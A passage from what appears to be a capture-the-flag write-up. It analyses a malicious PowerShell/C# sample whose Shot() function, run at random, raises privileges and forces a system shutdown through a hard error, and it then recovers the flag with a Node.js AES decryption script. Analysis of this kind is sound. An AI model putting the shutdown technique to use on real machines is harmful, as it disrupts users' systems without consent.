</span></span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs">            <span class="z-support z-type z-cs">ICryptoTransform</span> <span class="z-variable z-other z-cs">d</span> <span class="z-keyword z-operator z-assignment z-variable z-cs">=</span> <span class="z-variable z-other z-cs">a</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-meta z-function-call z-cs"><span class="z-variable z-function z-cs">CreateDecryptor</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-function-call z-cs"><span class="z-meta z-group z-cs"><span class="z-variable z-other z-cs">a</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-variable z-other z-cs">Key</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-variable z-other z-cs">a</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-variable z-other z-cs">IV</span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-punctuation z-terminator z-statement z-cs">;</span>
</span></span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs">            <span class="z-keyword z-control z-using z-cs">using</span> <span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span><span class="z-meta z-group z-cs"><span class="z-storage z-type z-variable z-cs">var</span> <span class="z-variable z-other z-cs">m</span> <span class="z-keyword z-operator z-assignment z-variable z-cs">=</span> <span class="z-meta z-instance z-cs"><span class="z-keyword z-operator z-new z-cs">new</span></span><span class="z-meta z-instance z-cs"> </span><span class="z-meta z-instance z-cs"><span class="z-support z-type z-cs">MemoryStream</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-instance z-cs"><span class="z-meta z-group z-cs"><span class="z-variable z-other z-cs">c</span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span>
</span></span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs">            <span class="z-keyword z-control z-using z-cs">using</span> <span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span><span class="z-meta z-group z-cs"><span class="z-storage z-type z-variable z-cs">var</span> <span class="z-variable z-other z-cs">y</span> <span class="z-keyword z-operator z-assignment z-variable z-cs">=</span> <span class="z-meta z-instance z-cs"><span class="z-keyword z-operator z-new z-cs">new</span></span><span class="z-meta z-instance z-cs"> </span><span class="z-meta z-instance z-cs"><span class="z-support z-type z-cs">CryptoStream</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-instance z-cs"><span class="z-meta z-group z-cs"><span class="z-variable z-other z-cs">m</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-variable z-other z-cs">d</span><span class="z-punctuation z-separator z-argument z-cs">,</span> <span class="z-variable z-other z-cs">CryptoStreamMode</span><span class="z-punctuation z-accessor z-dot z-cs">.</span><span class="z-variable z-other z-cs">Read</span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span>
</span></span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs">            <span class="z-keyword z-control z-using z-cs">using</span> <span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span><span class="z-meta z-group z-cs"><span class="z-storage z-type z-variable z-cs">var</span> <span class="z-variable z-other z-cs">s</span> <span class="z-keyword z-operator z-assignment z-variable z-cs">=</span> <span class="z-meta z-instance z-cs"><span class="z-keyword z-operator z-new z-cs">new</span></span><span class="z-meta z-instance z-cs"> </span><span class="z-meta z-instance z-cs"><span class="z-support z-type z-cs">StreamReader</span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-begin z-cs">(</span></span></span><span class="z-meta z-instance z-cs"><span class="z-meta z-group z-cs"><span class="z-variable z-other z-cs">y</span><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span><span class="z-meta z-group z-cs"><span class="z-punctuation z-section z-group z-end z-cs">)</span></span></span>
</span></span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs">            <span class="z-meta z-block z-cs"><span class="z-punctuation z-section z-block z-begin z-cs">{</span>
</span></span></span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs">                <span class="z-keyword z-control z-flow z-return z-cs">return</span> <span class="z-variable z-other z-cs">decryptedText</span><span class="z-punctuation z-terminator z-statement z-cs">;</span>
</span></span></span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs">            <span class="z-punctuation z-section z-block z-end z-cs">}</span></span>
</span></span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-block z-cs">        <span class="z-punctuation z-section z-block z-end z-cs">}</span></span>
</span></span></span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-meta z-method z-body z-cs"><span class="z-meta z-block z-cs">    <span class="z-punctuation z-section z-block z-end z-cs">}</span></span></span>
</span></span></span><span class="z-source z-cs"><span class="z-meta z-class z-body z-cs"><span class="z-meta z-block z-cs"><span class="z-punctuation z-section z-block z-end z-cs">}</span></span></span>
</span></code></pre><p>We have a simple AES encryption going inside the <code>Shot()</code> function, which is then conditionally called in the script from the previous URL:<pre class="language-powershell z-code" data-lang=powershell><code class=language-powershell data-lang=powershell><span class="z-source z-powershell"><span class="z-keyword z-control z-powershell">if</span> <span class="z-punctuation z-section z-group z-begin z-powershell">(</span><span class="z-interpolated z-simple z-source z-powershell"><span class="z-punctuation z-section z-group z-begin z-powershell">(</span><span class="z-interpolated z-simple z-source z-powershell"><span class="z-support z-function z-powershell">Get-Random</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Min <span class="z-constant z-numeric z-integer z-powershell">1</span> <span class="z-keyword z-operator z-assignment z-powershell">-</span>Max <span class="z-constant z-numeric z-integer z-powershell">7</span></span><span class="z-punctuation z-section z-group z-end z-powershell">)</span> <span class="z-keyword z-operator z-comparison z-powershell">-eq</span> <span class="z-constant z-numeric z-integer z-powershell">1</span></span><span class="z-punctuation z-section z-group z-end z-powershell">)</span> <span class="z-meta z-scriptblock z-powershell"><span class="z-punctuation z-section z-braces z-begin z-powershell">{</span> <span class="z-punctuation z-section z-bracket z-begin z-powershell">[</span><span class="z-storage z-type z-powershell">X</span><span class="z-punctuation z-section z-bracket z-end z-powershell">]</span>::Shot<span class="z-punctuation z-section z-group z-begin z-powershell">(</span><span class="z-punctuation z-section z-group z-end z-powershell">)</span> <span class="z-punctuation z-section z-braces z-end z-powershell">}</span></span>
</span></code></pre><p>Our <code>Shot()</code> function basically adjusts the program's privileges to allow it to shutdown the system and then raises an error <code>0xc0000022</code> telling the system it needs to shut down with the <code>6</code> (shutdown action) argument.<p>It was getting pretty late at the time of solving this and I did not have the courage to compile csharp at midnight on a mac without visual studio and a 10Mpbs Internet connection, so I decided to rewrite the encryption process from the file in nodejs.<pre class="language-js z-code" data-lang=js><code class=language-js data-lang=js><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">crypto</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-support z-function z-ts">require</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>crypto<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">encryptedText</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-support z-class z-node z-ts">Buffer</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">from</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>RNo8TZ56Rv+EyZW73NocFOIiNFfL45tXw24UogGdHkswea/WhnNhCNwjQn1aWjfw<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>base64<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">aesKey</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-support z-class z-node z-ts">Buffer</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">from</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>/a1Y+fspq/NwlcPwpaT3irY2hcEytktuH7LsY+NlLew=<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>base64<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">aesIv</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-support z-class z-node z-ts">Buffer</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">from</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>9sXGmK4q9LdYFdOp4TSsQw==<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>base64<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">const</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-constant z-ts">decipher</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">crypto</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">createDecipheriv</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>aes-256-cbc<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-variable z-other z-readwrite z-ts">aesKey</span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-variable z-other z-readwrite z-ts">aesIv</span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-meta z-var z-expr z-ts"><span class="z-storage z-type z-ts">let</span> <span class="z-meta z-var-single-variable z-expr z-ts"><span class="z-meta z-definition z-variable z-ts"><span class="z-variable z-other z-readwrite z-ts">decrypted</span></span> </span><span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">decipher</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">update</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-other z-readwrite z-ts">encryptedText</span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>base64<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>utf-8<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts"><span class="z-variable z-other z-readwrite z-ts">decrypted</span> <span class="z-keyword z-operator z-assignment z-compound z-ts">+=</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">decipher</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">final</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">"</span>utf-8<span class="z-punctuation z-definition z-string z-end z-ts">"</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span><span class="z-source z-ts">
</span><span class="z-source z-ts"><span class="z-meta z-function-call z-ts"><span class="z-support z-class z-console z-ts">console</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-console z-ts">log</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-variable z-other z-readwrite z-ts">decrypted</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
</span></code></pre><p>Running this and we finally get the flag:<pre class=z-code><code><span class="z-text z-plain">flag{4e4f266d44717ff3af8bd92d292b79ec}
</span></code></pre></article></div></main><div class="bg-secondary text-primary-foreground w-fit fixed bottom-4 float-right right-8 transition-all duration-200 opacity-0" title="Scroll to top" id=scroll-to-top><div class="bg-primary h-full absolute -z-10" id=scroll-fill></div><svg class="h-6 w-6 mx-4 md:my-2 my-1 fill-primary-foreground" viewbox="0 0 16 16" xmlns=http://www.w3.org/2000/svg><path d="M3.47 7.78a.75.75 0 0 1 0-1.06l4.25-4.25a.75.75 0 0 1 1.06 0l4.25 4.25a.751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018L9 4.81v7.44a.75.75 0 0 1-1.5 0V4.81L4.53 7.78a.75.75 0 0 1-1.06 0Z"></path></svg></div>